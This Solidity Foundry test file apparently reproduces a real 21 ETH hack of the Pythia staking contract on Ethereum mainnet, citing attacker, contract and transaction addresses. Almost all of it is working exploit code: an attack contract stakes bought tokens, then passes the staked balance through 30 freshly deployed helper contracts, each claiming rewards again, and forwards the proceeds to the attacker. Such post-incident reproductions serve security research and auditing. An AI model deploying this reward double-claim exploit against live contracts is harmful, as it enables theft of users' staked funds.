// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 21 ETH
// Attacker : https://etherscan.io/address/0xd861e6f1760d014d6ee6428cf7f7d732563c74c0
// Attack Contract : https://etherscan.io/address/0x542533536e314180e1b9f00b2c046f6282eb3647
// Vulnerable Contract : https://etherscan.io/address/0xe2910b29252F97bb6F3Cc5E66BfA0551821C7461
// Attack Tx : https://etherscan.io/tx/0x7e19f8edb1f1666322113f15d7674593950ac94bbc25d2aff96adabdcae0a6c3

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xe2910b29252F97bb6F3Cc5E66BfA0551821C7461#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/QuillAudits_AI/status/1830976830607892649
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant PYTHIA_STAKING = 0xe2910b29252F97bb6F3Cc5E66BfA0551821C7461;
address constant PYTHIA_TOKEN = 0x66149ab384Cc066FB9E6bC140F1378D1015045E9;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

contract Pythia is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 20667429 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = PYTHIA_STAKING;
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        vm.deal(address(this), 1 ether);
        AttackContract attackContract = new AttackContract();
        attackContract.stake{value: 0.5 ether}();

        attackContract.claimRewards();
    }
}

contract AttackContract {
    address attacker;
    constructor() {
        attacker = msg.sender;
    }
    function stake() payable public {
        uint256 amountOutMin = 10 * 1e18;
        address[] memory path = new address[](2);
        path[0] = WETH_ADDR;
        path[1] = PYTHIA_TOKEN;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.5 ether}(amountOutMin, path, address(this), block.timestamp);
        IERC20 pythia = IERC20(PYTHIA_TOKEN);
        uint256 bal = pythia.balanceOf(address(this));

        pythia.approve(PYTHIA_STAKING, type(uint256).max);
        IPythiaStaking(PYTHIA_STAKING).stake(bal);
    }

    function claimRewards() public {
        IPythiaStaking spythia = IPythiaStaking(PYTHIA_STAKING);
        IERC20 pythia = IERC20(PYTHIA_TOKEN);
        
        for (uint256 i = 0; i < 30; i++) {
            uint256 stakeBal = spythia.balanceOf(address(this));
            Helper helper = new Helper();

            spythia.transfer(address(helper), stakeBal);
            helper.attack();

            uint256 bal = pythia.balanceOf(address(this));
            spythia.stake(bal);
        }
        spythia.transfer(attacker, spythia.balanceOf(address(this)));
    }
}

contract Helper {
    function attack() public {
        IPythiaStaking spythia = IPythiaStaking(PYTHIA_STAKING);
        IERC20 pythia = IERC20(PYTHIA_TOKEN);
        // uint256 bal = pythia.balanceOf(address(this));
        uint256 stakeBal = spythia.balanceOf(address(this));

        spythia.claimRewards();

        uint256 bal = pythia.balanceOf(address(this));
        pythia.transfer(msg.sender, bal);

        spythia.transfer(msg.sender, stakeBal);
    }

}

interface IPythiaStaking is IERC20 {
    function stake(uint256 amount) external;
    function claimRewards() external;
}
